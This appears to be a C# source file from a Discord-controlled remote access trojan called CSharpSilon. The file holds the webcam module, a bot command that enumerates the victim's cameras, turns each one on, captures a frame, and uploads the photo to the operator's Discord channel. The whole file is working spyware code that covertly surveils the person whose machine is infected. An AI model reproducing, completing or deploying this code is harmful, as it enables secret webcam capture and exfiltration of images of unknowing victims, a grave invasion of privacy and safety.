using System;
using System.IO;
using System.Management;
using DarrenLee.Media;
using Discord.Commands;
using System.Threading.Tasks;
using Discord;
using Color = Discord.Color;

namespace CSharpSilon.cmds
{
    public class Webcam : ModuleBase<SocketCommandContext>
    {
        private Camera myCamera;

        [Command("capture"), Alias("wc", "webcam"), Summary("Takes a picture of the user's camera.")]
        public async Task WebcamCapture()
        {
            
            try
            {
                if (GetConnectedCamerasCount() == 0)
                {
                    await Context.Channel.SendMessageAsync(embed: new EmbedBuilder()
                        .WithTitle("Webcam Capture")
                        .WithDescription("No Cameras Found On The User's Machine.")
                        .WithColor(Color.Red)
                        .Build());
                    return;
                }
                
                var cameraDevices = myCamera.GetCameraSources();
                foreach (var device in cameraDevices)
                {
                    myCamera.ChangeCamera(cameraDevices.IndexOf(device));

                    var resolutions = myCamera.GetSupportedResolutions();
                    if (resolutions.Count == 0)
                    {
                        await Context.Channel.SendMessageAsync(embed: new EmbedBuilder()
                            .WithTitle("Webcam Capture")
                            .WithDescription($"No Resolutions Available For: {device}")
                            .WithColor(Color.Orange)
                            .Build());
                        continue;
                    }

                    myCamera.Start(0);

                    await Task.Delay(9000);

                    System.Drawing.Image img = CaptureFrame();
                    if (img != null)
                    {
                        string tempFilePath = Path.ChangeExtension(Path.GetTempFileName(), ".jpg");
                        img.Save(tempFilePath, System.Drawing.Imaging.ImageFormat.Jpeg);

                        await Context.Channel.SendMessageAsync(embed: new EmbedBuilder()
                            .WithTitle("Webcam Capture")
                            .WithDescription($"Captured Image From: {device}")
                            .WithColor(Color.Green)
                            .Build());
                        await Context.Channel.SendFileAsync(tempFilePath);

                        File.Delete(tempFilePath);
                    }
                    else
                    {
                        await Context.Channel.SendMessageAsync(embed: new EmbedBuilder()
                            .WithTitle("Webcam Capture")
                            .WithDescription($"Failed To Capture Image From: {device}")
                            .WithColor(Color.Red)
                            .Build());
                    }

                    myCamera.Stop();
                }
            }
            catch (Exception ex)
            {
                await Context.Channel.SendMessageAsync(embed: new EmbedBuilder()
                    .WithTitle("Webcam Capture Error")
                    .WithDescription($"Error: {ex.Message}")
                    .WithColor(Color.DarkRed)
                    .Build());
            }
        }

        private System.Drawing.Image CaptureFrame()
        {
            System.Drawing.Image img = null;
            bool frameCaptured = false;

            myCamera.OnFrameArrived += (source, e) =>
            {
                img = e.GetFrame();
                frameCaptured = true;
            };

            for (int waitTime = 0; !frameCaptured && waitTime < 5000; waitTime += 200)
            {
                Task.Delay(200).Wait();
            }

            return img;
        }
        
        public static int GetConnectedCamerasCount()
        {
            var cameras = 0;
            try
            {
                using (var searcher =
                       new ManagementObjectSearcher(
                           "SELECT * FROM Win32_PnPEntity WHERE (PNPClass = 'Image' OR PNPClass = 'Camera')"))
                {
                    foreach (var dummy in searcher.Get())
                        cameras++;
                }
            }
            catch { }

            return cameras;
        }
    }
}
